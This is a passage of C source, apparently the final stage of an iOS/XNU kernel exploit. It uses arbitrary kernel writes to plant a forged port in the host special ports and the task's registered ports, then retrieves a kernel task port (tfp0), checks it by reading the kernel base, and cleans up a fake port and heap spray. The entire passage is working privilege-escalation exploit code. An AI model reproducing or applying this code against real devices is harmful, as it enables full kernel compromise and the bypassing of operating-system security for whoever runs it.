    kwrite64(realhost + 0x10 + (sizeof(uint64_t) * 4), new_port);
    LOG("registered realhost->special[4]");

    // zero out old ports before overwriting
    for (int i = 0; i < 3; i++)
    {
        kwrite64(curr_task + offsets.struct_offsets.itk_registered + (i * 0x8), 0x0);
    }

    kwrite64(curr_task + offsets.struct_offsets.itk_registered, new_port);
    LOG("wrote new port: %llx", new_port);
    
    ret = mach_ports_lookup(mach_task_self(), &maps, &maps_num);
    
//    kwrite64(curr_task + ITK_REGISTERED_OFFSET, 0x0);

    if (ret != KERN_SUCCESS)
    {
        LOG("failed to lookup mach ports: %x (%s)", ret, mach_error_string(ret));
        ret = KERN_FAILURE;
        goto out;
    }
    
    mach_port_t kernel_task = maps[0];
    if (!MACH_PORT_VALID(kernel_task))
    {
        LOG("kernel_task is invalid");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("got kernel task port: %x", kernel_task);

    // should be ready? pullup !

    uint64_t kernel_base = offsets.constant.kernel_image_base + kslide;

    // test tfp0
    vm_offset_t data_out = 0x0;
    mach_msg_type_number_t out_size = 0x0;
    ret = mach_vm_read(kernel_task, kernel_base, sizeof(uint64_t), &data_out, &out_size);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed read on kern base via tfp0: %x (%s)", ret, mach_error_string(ret));
        ret = KERN_FAILURE;
        goto out;
    }

    LOG("---> task for pid 0 achieved!");
    LOG("[!] kernel base data: %llx", *(uint64_t *)data_out);
    
    LOG("---> exploitation complete.");
    
    *tfp0 = kernel_task;
    *kbase = kernel_base;

    ret = KERN_SUCCESS;

out:;
    if (ret != KERN_SUCCESS)
    {
        LOG("allowing logs to propagate...");
        sleep(1);
    }

    if (fakeport)
    {
        fakeport->ip_bits = 0x0;
        fakeport->ip_kobject = 0x0;
        kdata_write((const void *)fakeport);
    }

    if (MACH_PORT_VALID(the_one))
    {
        mach_port_deallocate(mach_task_self(), the_one);
    }

    release_spray_data();
    // kdata_cleanup();

    return ret;
}
